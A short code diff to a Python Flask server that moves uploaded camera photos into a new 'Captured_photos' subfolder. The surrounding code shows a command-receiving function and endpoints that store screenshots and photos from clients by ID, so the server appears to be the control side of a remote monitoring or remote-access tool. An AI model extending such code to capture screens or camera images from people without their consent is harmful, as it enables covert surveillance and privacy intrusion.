@@ -541,7 +541,9 @@ def receive_command():
 
 
 UPLOAD_FOLDER = "uploads"
+capture_photo_upload_folder = f"{UPLOAD_FOLDER}/Captured_photos"
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+os.makedirs(capture_photo_upload_folder, exist_ok=True)
 
 @app.route("/api/screenshot", methods=["POST"])
 def save_screenshot():
@@ -1155,7 +1157,7 @@ def save_photo():
         # Generate timestamp for unique filename
         timestamp = int(time.time())  # Unix timestamp in seconds
         filename = f"{client_id}-photo-{timestamp}.jpg"
-        file_path = os.path.join(UPLOAD_FOLDER, filename)
+        file_path = os.path.join(capture_photo_upload_folder, filename)
 
         # Save the photo data to the file
         with open(file_path, 'wb') as f:
